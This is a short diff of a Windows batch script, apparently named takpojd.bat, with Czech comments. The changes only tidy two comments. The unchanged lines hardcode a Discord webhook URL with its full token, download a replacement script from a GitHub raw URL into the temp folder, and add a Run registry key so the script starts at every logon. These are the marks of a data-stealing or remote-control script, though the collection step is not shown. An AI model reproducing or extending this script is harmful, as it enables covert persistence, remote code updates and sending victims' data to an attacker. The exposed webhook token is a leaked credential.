@@ -2,10 +2,10 @@
 chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
-:: 🌐 Webhook pro vše tady test
+:: 🌐 Webhook pro vše
 set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"
 
-:: 🔁 GitHub RAW URL pro aktualizaci tady test
+:: 🔁 GitHub RAW URL pro aktualizaci
 set "updateURL=https://raw.githubusercontent.com/fanysfanys00-ctrl/mc/refs/heads/main/takpojd.bat"
 set "currentPath=%~f0"
 set "updatePath=%TEMP%\takpojd_update.bat"
@@ -103,4 +103,5 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "takpojd" /t REG
 
 :: ✅ Hotovo
 exit
+
 
